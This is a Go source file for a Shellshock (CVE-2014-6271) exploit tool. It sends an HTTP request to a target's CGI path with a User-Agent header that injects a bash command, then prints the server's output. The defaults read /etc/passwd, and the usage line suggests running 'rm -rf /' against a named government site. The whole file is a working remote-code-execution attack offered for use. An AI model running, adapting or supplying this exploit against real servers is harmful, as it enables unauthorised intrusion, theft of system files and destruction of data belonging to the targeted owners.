//Script created by w4fz5uck5  -> https://github.com/w4fz5uck5/ShockZaum-CVE-2014-6271/ 

package main 

import (
	"net/http"
	"github.com/fatih/color"
	"io/ioutil"
	"flag"
	"fmt"
)


func Banner(){
color.Red("  ██████  ██░ ██  ▒█████   ▄████▄   ██ ▄█▀▒███████▒ ▄▄▄       █    ██  ███▄ ▄███▓")
color.Red("▒██    ▒ ▓██░ ██▒▒██▒  ██▒▒██▀ ▀█   ██▄█▒ ▒ ▒ ▒ ▄▀░▒████▄     ██  ▓██▒▓██▒▀█▀ ██▒")
color.Red("░ ▓██▄   ▒██▀▀██░▒██░  ██▒▒▓█    ▄ ▓███▄░ ░ ▒ ▄▀▒░ ▒██  ▀█▄  ▓██  ▒██░▓██    ▓██░")
color.Red("  ▒   ██▒░▓█ ░██ ▒██   ██░▒▓▓▄ ▄██▒▓██ █▄   ▄▀▒   ░░██▄▄▄▄██ ▓▓█  ░██░▒██    ▒██ ")
color.Red("▒██████▒▒░▓█▒░██▓░ ████▓▒░▒ ▓███▀ ░▒██▒ █▄▒███████▒ ▓█   ▓██▒▒▒█████▓ ▒██▒   ░██▒")
color.Red("▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░ ▒░▒░▒░ ░ ░▒ ▒  ░▒ ▒▒ ▓▒░▒▒ ▓░▒░▒ ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ░ ▒░   ░  ░")
color.Red("░ ░▒  ░ ░ ▒ ░▒░ ░  ░ ▒ ▒░   ░  ▒   ░ ░▒ ▒░░░▒ ▒ ░ ▒  ▒   ▒▒ ░░░▒░ ░ ░ ░  ░      ░")
color.Red("░  ░  ░   ░  ░░ ░░ ░ ░ ▒  ░        ░ ░░ ░ ░ ░ ░ ░ ░  ░   ▒    ░░░ ░ ░ ░      ░   ")
color.Red("      ░   ░  ░  ░    ░ ░  ░ ░      ░  ░     ░ ░          ░  ░   ░            ░   ")
color.Red("                          ░               ░                                      ")
}

func Usage(){
	color.Yellow("[!] Usage: ./ShockZaum -u 'https://nasa.gov' -c 'rm -rf /' -p '/cgi-bin/aliens.cgi'")
}
var website = flag.String("u", "http://127.0.0.1:8080", "Website URL")
var path = flag.String("p", "/cgi-bin/stats", "Path to attack")
var cmd = flag.String("c", "cat /etc/passwd", "Command to execute on target machine")
func main(){
	Banner()
	Usage()
	flag.Parse()
	Client := &http.Client{}
	//Create request
	req, _:= http.NewRequest("GET", *website + *path, nil)
	req.Header.Add("User-Agent", "() { :; }; echo; echo; /bin/bash -c " + *cmd)
	//Send request
	resp, err := Client.Do(req)
	if err != nil{
		panic(err)
	}  
	//Get response
	body, _ := ioutil.ReadAll(resp.Body)
	color.Cyan("[*] Server response:")
	fmt.Println("\n"+string(body))
}
